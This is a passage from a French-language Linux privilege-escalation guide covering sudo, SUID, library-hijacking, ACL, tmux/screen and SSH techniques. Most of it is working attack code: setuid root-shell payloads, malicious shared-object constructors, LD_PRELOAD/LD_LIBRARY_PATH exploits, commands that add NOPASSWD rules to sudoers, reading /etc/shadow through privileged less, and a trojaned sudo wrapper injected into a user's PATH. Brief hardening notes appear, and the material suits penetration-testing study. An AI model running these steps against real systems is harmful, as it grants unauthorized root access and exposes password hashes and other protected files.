  - Une règle sudo que vous pouvez exécuter (n’importe quelle cible qui appelle `/bin/bash` de façon non interactive, ou n’importe quel script bash).
  - `BASH_ENV` présent dans `env_keep` (vérifiez avec `sudo -l`).

- PoC :

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Durcissement :
  - Retirer `BASH_ENV` (et `ENV`) de `env_keep` et privilégier `env_reset`.
  - Éviter les wrappers shell pour les commandes autorisées via sudo ; utiliser des binaires minimalistes.
  - Envisager la journalisation des entrées/sorties de sudo et la mise en place d’alertes en cas d’utilisation de variables d’environnement préservées.

### Terraform via sudo avec HOME préservé (!env_reset)

Lorsque sudo autorise l’exécution de Terraform avec les privilèges d’un utilisateur plus privilégié, `!env_reset` indique qu’il faut vérifier quelles variables d’environnement sont effectivement préservées par cette règle précise. Vérifiez la valeur effective de `HOME` ou de `TF_CLI_CONFIG_FILE` avant de considérer un `.terraformrc` ou un `terraform.rc` modifiable par l’appelant comme la configuration CLI active. Une entrée `provider_installation.dev_overrides` n’est pertinente que si la commande Terraform définie charge ce fournisseur et que l’appelant peut placer son exécutable dans le répertoire sélectionné.<sup>[[25]](#references)</sup>

- Diriger le fournisseur requis vers un répertoire modifiable et y déposer un plugin malveillant portant le nom du fournisseur (par ex. `terraform-provider-examples`) :

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform échouera lors de la négociation du plugin Go, mais exécutera la charge utile en tant que root avant de planter, laissant derrière lui un shell SUID.

### Contournement de la validation par symlink avec des variables `TF_VAR`

Les variables Terraform peuvent être fournies via des variables d’environnement `TF_VAR_<name>` si la règle sudo concernée les conserve. Une **lecture** via un symlink source nécessite également un provider qui suit le lien et copie le résultat protégé vers une destination lisible par l’appelant. Une **écriture** vers une destination symlink nécessite séparément une entrée de destination contrôlée par l’appelant et un provider privilégié qui la suit lors de l’écriture ; un job planifié ultérieur n’est qu’une conséquence possible. Avant de tester l’une ou l’autre de ces voies, inspectez l’autorisation sudo exacte, les fichiers `.tf` concernés, la configuration CLI sélectionnée et la propriété des chemins à l’aide de commandes en lecture seule telles que `sudo -l`, `stat` et `readlink`. Les validations lexicales faibles, comme `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, ne résolvent pas les symlinks :<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform résout le symlink et copie le vrai `/root/root.txt` vers une destination lisible par l’attaquant. La même approche peut être utilisée pour **écrire** dans des chemins privilégiés en précréant des symlinks dans la destination (par exemple, en pointant le chemin de destination du provider vers un emplacement dans `/etc/cron.d/`).

### requiretty / !requiretty

Sur certaines anciennes distributions, sudo peut être configuré avec `requiretty`, ce qui oblige sudo à s’exécuter depuis un TTY interactif. Si `!requiretty` est défini (ou si l’option est absente), sudo peut être exécuté depuis des contextes non interactifs, tels que des reverse shells, des tâches cron ou des scripts.

```bash
Defaults !requiretty
```

Ce n’est pas une vulnérabilité directe en soi, mais cela élargit les situations dans lesquelles les règles sudo peuvent être abusées sans avoir besoin d’un PTY complet.

### Sudo env_keep+=PATH / secure_path non sécurisé → PATH hijack

Si `sudo -l` affiche `env_keep+=PATH` ou un `secure_path` contenant des entrées accessibles en écriture par un attaquant (par ex. `/home/<user>/bin`), une commande externe non qualifiée appelée dans la cible autorisée par sudo peut être masquée.<sup>[[3]](#references)</sup> L’absence d’un `secure_path` effectif mérite également d’être examinée **si** l’environnement sudo de la commande préserve un `PATH` contrôlé par l’appelant ; cette absence ne suffit pas à elle seule à le prouver. Lisez le script autorisé sans l’exécuter, puis vérifiez la règle exacte concernant RunAs et les arguments, le chemin de recherche effectif des commandes, ainsi que la présence d’un répertoire antérieur accessible en écriture et traversable contenant le nom de la commande. L’authentification, `NOEXEC`, les builtins du shell et les chemins absolus des commandes peuvent changer le résultat.

- Conditions requises : une règle sudo (souvent `NOPASSWD`) qui exécute un script/binaire appelant des commandes sans chemin absolu (`free`, `df`, `ps`, etc.) et une entrée `PATH` accessible en écriture qui est recherchée en premier.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Contournement des chemins lors de l’exécution de Sudo
**Passez** à d’autres fichiers pour les lire ou utilisez des **symlinks**. Par exemple, dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Si un **caractère générique** est utilisé (\*), c’est encore plus facile :

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Contremesures** : [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Commande sudo/binaire SUID sans chemin de commande

Si la **permission sudo** est accordée pour une seule commande **sans spécifier le chemin** : _hacker10 ALL= (root) less_, vous pouvez l’exploiter en modifiant la variable PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Cette technique peut également être utilisée si un binaire **suid** **exécute une autre commande sans en préciser le chemin (vérifiez toujours le contenu d’un binaire SUID suspect avec** _**strings**_ **)**.

[Exemples de payloads à exécuter.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binaire SUID avec chemin de commande

Si le binaire **suid** **exécute une autre commande en précisant son chemin**, vous pouvez essayer **d’exporter une fonction** portant le nom de la commande appelée par le fichier suid.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l’exporter :

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Ensuite, lorsque vous appellerez le binaire SUID, cette fonction sera exécutée

### Wrappers de copie SUID personnalisés

Un utilitaire SUID appartenant à root qui accepte des chemins source et destination peut franchir deux frontières de confiance différentes. S’il construit une commande shell à partir de l’un ou l’autre argument (par exemple, en transmettant à `system()` une commande `cp` construite), des métacaractères shell peuvent exécuter une autre commande avec ses privilèges effectifs. Même s’il invoque `cp` sans shell de manière sûre, une destination sans restriction peut permettre une écriture privilégiée arbitraire dans des fichiers tels que `/etc/passwd`. Examinez la gestion des arguments du wrapper, le comportement de l’UID effectif, les restrictions sur la destination et la possibilité que le fichier copié conserve un contenu contrôlé par l’appelant ; une erreur générique de `cp` ou le seul bit SUID ne prouve pas que l’un ou l’autre cas est possible. Énumérez le binaire et ses permissions de manière passive avant tout test manuel.

### Script accessible en écriture exécuté par un wrapper SUID

Une mauvaise configuration fréquente dans les applications personnalisées est un wrapper binaire SUID appartenant à root qui exécute un script alors que celui-ci est accessible en écriture par des utilisateurs disposant de faibles privilèges.

Modèle typique :

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Si `/usr/local/bin/backup.sh` est accessible en écriture, vous pouvez y ajouter des commandes payload, puis exécuter le wrapper SUID :

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Vérifications rapides :

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Cette voie d’attaque est particulièrement courante dans les wrappers de « maintenance »/« sauvegarde » fournis dans `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d’environnement **LD_PRELOAD** sert à spécifier une ou plusieurs bibliothèques partagées (fichiers .so) à charger par le chargeur avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est appelé préchargement d’une bibliothèque.

Cependant, afin de préserver la sécurité du système et d’empêcher l’exploitation de cette fonctionnalité, notamment avec les exécutables **suid/sgid**, le système impose certaines conditions :

- Le chargeur ignore **LD_PRELOAD** pour les exécutables dont l’ID utilisateur réel (_ruid_) ne correspond pas à l’ID utilisateur effectif (_euid_).
- Pour les exécutables suid/sgid, seules les bibliothèques situées dans les chemins standard et portant elles aussi les bits suid/sgid sont préchargées.

Une élévation de privilèges peut se produire si vous pouvez exécuter des commandes avec `sudo` et si la sortie de `sudo -l` inclut l’instruction **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d’environnement **LD_PRELOAD** de persister et d’être prise en compte même lorsque des commandes sont exécutées avec `sudo`, ce qui peut entraîner l’exécution de code arbitraire avec des privilèges élevés.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Enregistrer sous **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Puis **compilez-le** à l’aide de :

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Enfin, **escaladez les privilèges** en exécutant♀♀♀♀♀♀

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Un privesc similaire peut être exploité si l’attaquant contrôle la variable d’environnement **LD_LIBRARY_PATH**, car il contrôle le chemin où les bibliothèques seront recherchées.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Binaire SUID – injection .so

Lorsqu'on rencontre un binaire avec des permissions **SUID** qui semble inhabituel, il est recommandé de vérifier s'il charge correctement les fichiers **.so**. Pour cela, exécutez la commande suivante :<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Par exemple, rencontrer une erreur telle que _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère une possibilité d’exploitation.

Pour l’exploiter, il suffit de créer un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant :

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions des fichiers et en exécutant un shell avec des privilèges élevés.

Compilez le fichier C ci-dessus en un objet partagé (.so) avec :

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Enfin, l’exécution du binaire SUID affecté devrait déclencher l’exploit, permettant une éventuelle compromission du système.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Maintenant que nous avons trouvé un binaire SUID qui charge une bibliothèque depuis un dossier où nous pouvons écrire, créons la bibliothèque dans ce dossier avec le nom nécessaire :

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Si vous obtenez une erreur telle que

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

cela signifie que la bibliothèque que vous avez générée doit contenir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix qu’un attaquant peut exploiter pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est similaire, mais concerne les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet répertorie les fonctions légitimes des binaires Unix qui peuvent être détournées pour sortir de shells restreints, escalader ou conserver des privilèges élevés, transférer des fichiers, lancer des bind shells et des reverse shells, et faciliter d’autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si vous pouvez accéder à `sudo -l`, vous pouvez utiliser l’outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s’il trouve comment exploiter une règle sudo.

### Réutilisation des jetons sudo

Si vous avez **accès à sudo** mais pas le mot de passe, vous pouvez escalader vos privilèges en **attendant l’exécution d’une commande sudo, puis en détournant le jeton de session**.<sup>[[18]](#references)</sup>

Conditions requises pour escalader vos privilèges :

- Vous avez déjà un shell en tant qu’utilisateur "_sampleuser_"
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose au cours des **15 dernières minutes** (par défaut, c’est la durée du jeton sudo qui nous permet d’utiliser `sudo` sans saisir de mot de passe)
- `cat /proc/sys/kernel/yama/ptrace_scope` renvoie 0
- `gdb` est accessible (vous devez pouvoir l’envoyer)

(Vous pouvez activer temporairement `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, ou le modifier de façon permanente dans `/etc/sysctl.d/10-ptrace.conf` en définissant `kernel.yama.ptrace_scope = 0`.)

Si toutes ces conditions sont réunies, **vous pouvez escalader vos privilèges à l’aide de :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Le **premier exploit** (`exploit.sh`) crée le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l’utiliser pour **activer le jeton sudo dans votre session** (vous n’obtiendrez pas automatiquement un shell root ; exécutez `sudo su`) :

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- Le **second exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **appartenant à root avec setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- Le **troisième exploit** (`exploit_v3.sh`) va **créer un fichier sudoers** qui rend les **jetons sudo éternels et permet à tous les utilisateurs d’utiliser sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Si vous avez des **permissions d’écriture** dans le dossier ou sur l’un des fichiers créés à l’intérieur, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un sudo token pour un utilisateur et un PID**.\
Par exemple, si vous pouvez remplacer le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en exécutant :

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers contenus dans `/etc/sudoers.d` définissent qui peut utiliser `sudo` et de quelle manière. Par défaut, ces fichiers **ne peuvent être lus que par l’utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez **obtenir des informations intéressantes** ; et si vous pouvez **écrire** dans un fichier, vous pourrez **escalader vos privilèges**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Si vous pouvez écrire, vous pouvez abuser de cette permission.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Une autre façon d’abuser de ces permissions :

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Il existe des alternatives au binaire `sudo`, comme `doas` pour OpenBSD. Pensez à vérifier sa configuration dans `/etc/doas.conf`.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Si `doas` autorise un éditeur ou un interpréteur, vérifiez les techniques d’échappement de type GTFOBins :

```bash
doas vim
:!/bin/sh
```

Une règle `doas` autorisant l’exécution en tant que root pour le `dstat` d’origine, basé sur Python, mérite également une vérification du chemin des plugins. Son [manuel](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) et son [code source](https://github.com/dstat-real/dstat/blob/master/dstat) indiquent notamment `/usr/share/dstat/` et `/usr/local/share/dstat/` comme emplacements des plugins `dstat_*.py`. Si l’utilisateur actuel peut écrire dans un emplacement effectivement utilisé par la build installée et y accéder, un plugin sélectionné peut s’exécuter avec l’identité RunAs de `doas`. Vérifiez la règle effective, la recherche de plugins dans cette build, les permissions ou ACL du répertoire et de ses répertoires parents, ainsi que la possibilité pour l’appelant de sélectionner un plugin ; une règle `dstat` ou un répertoire accessible en écriture ne constitue qu’une piste. D’autres implémentations de `dstat` peuvent utiliser des systèmes de plugins différents. Examinez les métadonnées sans charger de plugin.

### Sudo Hijacking

Si vous savez qu’un **utilisateur se connecte habituellement à une machine et utilise `sudo`** pour élever ses privilèges et que vous avez obtenu un shell dans le contexte de cet utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root, puis la commande de l’utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple, en ajoutant le nouveau chemin dans `.bash_profile`) afin que votre exécutable sudo soit lancé lorsque l’utilisateur exécute sudo.

Notez que si l’utilisateur utilise un autre shell (pas bash), vous devrez modifier d’autres fichiers pour ajouter le nouveau chemin. Par exemple, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc` et `~/.bash_profile`. Vous trouverez un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en exécutant quelque chose comme :

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **où se trouvent les fichiers de configuration chargés**. En général, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **indiquent d'autres dossiers** dans lesquels les **bibliothèques** seront **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système recherchera des bibliothèques dans `/usr/local/lib`**.

Si, pour une raison quelconque, **un utilisateur dispose des permissions d'écriture** sur l'un des chemins indiqués — `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, un fichier situé dans `/etc/ld.so.conf.d/` ou un dossier indiqué dans un fichier de configuration de `/etc/ld.so.conf.d/*.conf` —, il peut être en mesure d'élever ses privilèges.\
Consultez **la méthode permettant d'exploiter cette mauvaise configuration** sur la page suivante :


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

En copiant la bibliothèque dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet emplacement, comme indiqué dans la variable `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Créez ensuite une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capacités

Les Linux capabilities fournissent à un **processus un sous-ensemble des privilèges root disponibles**. Cela permet de diviser les **privilèges root en unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. Ainsi, l’ensemble complet des privilèges est réduit, ce qui diminue les risques d’exploitation.\
Consultez la page suivante pour **en savoir plus sur les capabilities et comment en abuser** :


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permissions des répertoires

Dans un répertoire, le **bit « execute »** signifie que l’utilisateur concerné peut faire un "**cd**" dans le dossier.\
Le bit **« read »** signifie que l’utilisateur peut **lister** les **fichiers**, et le bit **« write »** signifie qu’il peut **supprimer** et **créer** de nouveaux **fichiers**.

## ACLs

Les listes de contrôle d’accès (ACLs) constituent une couche secondaire d’autorisations discrétionnaires, capable de **remplacer les permissions ugo/rwx traditionnelles**. Ces permissions améliorent le contrôle de l’accès aux fichiers ou aux répertoires en permettant ou en refusant des droits à des utilisateurs qui ne sont ni propriétaires ni membres du groupe. Ce niveau de **granularité permet une gestion des accès plus précise**. Vous trouverez plus d’informations [**ici**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Accorder** à l’utilisateur "kali" des permissions de lecture et d’écriture sur un fichier :

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Récupérer** les fichiers dotés d’ACL spécifiques depuis le système :

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Porte dérobée ACL cachée dans les fichiers inclus de sudoers

Une erreur de configuration courante est un fichier de `/etc/sudoers.d/` appartenant à root et avec le mode `440`, qui accorde tout de même un accès en écriture à un utilisateur peu privilégié via une ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Si vous voyez quelque chose comme `user:alice:rw-`, l’utilisateur peut ajouter une règle sudo malgré des bits de permission restrictifs :

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Cette voie de persistance/privesc via ACL peut avoir un impact élevé, car elle passe facilement inaperçue lors d’un examen limité à `ls -l`.

## Sessions shell ouvertes

L’accès interutilisateur à GNU Screen dépend de la **configuration et de l’ACL de la session en cours d’exécution**, et pas seulement de sa version. [La documentation de GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) indique que Screen doit être compilé avec la prise en charge multiutilisateur ; les commandes `multiuser on` et `acladd`, ou une commande `aclchg` appropriée, permettent à un autre utilisateur de s’y attacher. [Le manuel exige également le bit setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) pour la recherche de sessions interutilisateur. Un socket visible appartenant à root ou un binaire `screen` SUID ne suffit pas à prouver qu’un shell root auquel s’attacher est disponible. Avant de considérer cela comme une élévation de privilèges, vérifiez que la session active est en mode multiutilisateur, que l’utilisateur actuel dispose des autorisations effectives de saisie et de commande, et que le shell de cette session s’exécute avec les privilèges de son propriétaire.

### screen sessions hijacking

**Lister les sessions screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![Détournement de sessions screen - Emplacements des sockets (certains systèmes en exposent un sous forme de lien symbolique vers l’autre) : ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Se connecter à une session**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Détournement de sessions tmux

C'était un problème avec les **anciennes versions de tmux**. Je n'ai pas réussi à détourner une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**Lister les sessions tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Emplacements des sockets (certains systèmes en exposent un sous forme de lien symbolique vers l’autre) - détournement de sessions tmux : tmux -S /tmp/dev sess ls Listez les sessions à l’aide de ce socket ; vous pouvez démarrer une session tmux sur ce socket...](<../../images/image (837).png>)

**Se connecter à une session**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Consultez **Valentine box from HTB** pour un exemple.

## SSH

### PRNG OpenSSL prévisible de Debian - CVE-2008-0166

Les clés générées avec des versions vulnérables d'OpenSSL de Debian ou de ses dérivés pendant la période historique de vulnérabilité peuvent avoir un caractère aléatoire prévisible ; la distribution actuelle de l'hôte ou la version corrigée d'OpenSSL ne permet pas de déterminer comment une ancienne clé a été générée. Vérifiez la **clé spécifique** à l'aide d'une liste noire historique appropriée et examinez sa provenance. Le [manuel `ssh-vulnkey` de Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) décrit comment vérifier les clés publiques et `authorized_keys`, et [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) consigne le correctif d'OpenSSL. Une entrée dans le fichier `authorized_keys` d'un compte privilégié constitue une piste d'escalade uniquement si la clé privée correspondante peut être récupérée et que la politique SSH effective accepte toujours cette clé pour ce compte ; une clé **host** faible n'est pas en soi un identifiant de connexion. Remplacez les clés compromises et supprimez leurs anciennes autorisations.

### Valeurs de configuration SSH intéressantes

- **PasswordAuthentication:** indique si l'authentification par mot de passe est autorisée. La valeur par défaut d'OpenSSH en amont est `yes` ; la configuration de la distribution peut la remplacer.
- **PubkeyAuthentication:** indique si l'authentification par clé publique est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords**: lorsque l'authentification par mot de passe est autorisée, indique si le serveur autorise la connexion aux comptes dont le mot de passe est vide. La valeur par défaut est `no`.

### Fichiers de contrôle de connexion

Ces fichiers déterminent qui peut se connecter et de quelle manière :

- **`/etc/nologin`**: s'il existe, bloque les connexions des utilisateurs autres que root et affiche son message.
- **`/etc/securetty`**: restreint les endroits où root peut se connecter (liste d'autorisation des TTY).
- **`/etc/motd`**: bannière affichée après la connexion (peut révéler des informations sur l'environnement ou la maintenance).

### PermitRootLogin

Indique si root peut se connecter via ssh. La valeur par défaut d'OpenSSH en amont est `prohibit-password` ; la configuration de la distribution peut la remplacer. Valeurs possibles :

- `yes`: root peut se connecter avec un mot de passe ou une clé privée
- `without-password` ou `prohibit-password`: root ne peut se connecter qu'avec une clé privée
- `forced-commands-only`: root ne peut se connecter qu'avec une clé privée et si les options de commandes sont spécifiées
- `no` : non

### Autorités de certification de certificats utilisateur SSH de confiance

`TrustedUserCAKeys` désigne les clés publiques auxquelles sshd fait confiance pour signer des certificats **utilisateur**. Si la clé privée CA correspondante est lisible par un utilisateur moins privilégié, vérifiez qui peut obtenir un certificat et pour quels principaux de compte celui-ci pourrait servir à s'authentifier. `AuthorizedPrincipalsFile` ou `AuthorizedPrincipalsCommand` peuvent restreindre les noms acceptés ; si aucun des deux n'est configuré, le certificat doit contenir le nom du compte cible. `PermitRootLogin prohibit-password` bloque l'authentification de root par mot de passe, mais peut toujours autoriser l'authentification par certificat. La simple exposition d'un chemin de clé ne prouve pas l'existence d'un accès : vérifiez la paire de clés publique/privée, les règles `Match` effectives, la politique du compte, la phrase secrète de la clé, sa révocation et les algorithmes de signature acceptés. N'incluez pas les octets de clés privées dans la sortie de l'énumération. Consultez le [manuel de configuration du serveur OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

